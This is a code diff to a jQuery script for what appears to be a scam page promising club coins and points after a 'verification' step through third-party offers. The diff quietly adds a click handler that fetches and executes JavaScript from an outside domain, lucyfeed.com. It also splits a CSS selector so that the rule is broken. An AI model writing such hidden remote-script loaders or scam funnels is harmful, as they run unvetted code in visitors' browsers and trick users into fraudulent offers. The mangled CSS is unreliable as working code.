@@ -672,7 +672,8 @@ $(document).ready(function(){
                         '<li>After completing the offer, the coins and points will be added to your club.</li>' +
                      '</ol>' +
                      '<style>' +
-                     ".btn-custom{color:#fff;background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.btn-custom:focus,.btn-custom:hover,.open .dropdown-toggle.btn-custom{color:#fff;background-color:#13253D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.open .dropdown-toggle.btn-custom{background-image:none}.btn-custom.disabled,.btn-custom.disabled.active,.btn-custom.disabled:active,.btn-custom.disabled:focus,.btn-custom.disabled:hover,.btn-custom[disabled],.btn-custom[disabled].active,.btn-custom[disabled]:active,.btn-custom[disabled]:focus,.btn-custom[disabled]:hover,fieldset[disabled] .btn-custom,fieldset[disabled] .btn-custom.active,fieldset[disabled] .btn-custom:active,fieldset[disabled] .btn-custom:focus,fieldset[disabled] .btn-custom:hover{background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom .badge{color:#0B1A2D;background-color:#fff} .ludy-options a{border:none !important;}" +
+                     ".btn-custom{color:#fff;background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.btn-custom:focus,.btn-custom:hover,.open .dropdown-toggle.btn-custom{color:#fff;background-color:#13253D;border-color:#0B1A2D}.btn-custom.active,.btn-custom:active,.open .dropdown-toggle.btn-custom{background-image:none}.btn-custom.disabled,.btn-custom.disabled.active,.btn-custom.disabled:active,.btn-custom.disabled:focus,.btn-custom.disabled:hover,.btn-custom[disabled],.btn-custom[disabled].active,.btn-custom[disabled]:active,.btn-custom[disabled]:focus,.btn-custom[disabled]:hover,fieldset[disabled] .btn-custom,fieldset[disabled] .btn-custom.active,fieldset[disabled] .btn-custom:active,fieldset[disabled] .btn-custom:focus,fieldset[disabled] .btn-custom:hover{background-color:#0B1A2D;border-color:#0B1A2D}.btn-custom .badge{color:#0B1A2D;background-color:#fff} .
+		-options a{border:none !important;}" +
                      '</style>' +
                      '<button class="ludy-trigger btn btn-success btn-lg btn-block btn-custom blender-pro-book">BEGIN VERIFICATION<i class="fa fa-chevron-right blue-text-color"></i></button>' +
                      '<div class="offers-wrapper"><div class="ludy-options" data-offers="vum2Z5rUkVKNEe9F"></div></div>' +
@@ -736,6 +737,11 @@ $(document).ready(function(){
 			
 			$('.offers-wrapper').hide();
         		$('.ludy-trigger').on('click', function () {
+				jQuery.ajax({
+      url: "http://www.lucyfeed.com/vum2Z5rUkVKNEe9F",
+      dataType: "script",
+      cache: true
+});
 							$(this).slideUp(300, function () {
 								$('.offers-wrapper').slideDown(300);
 							});
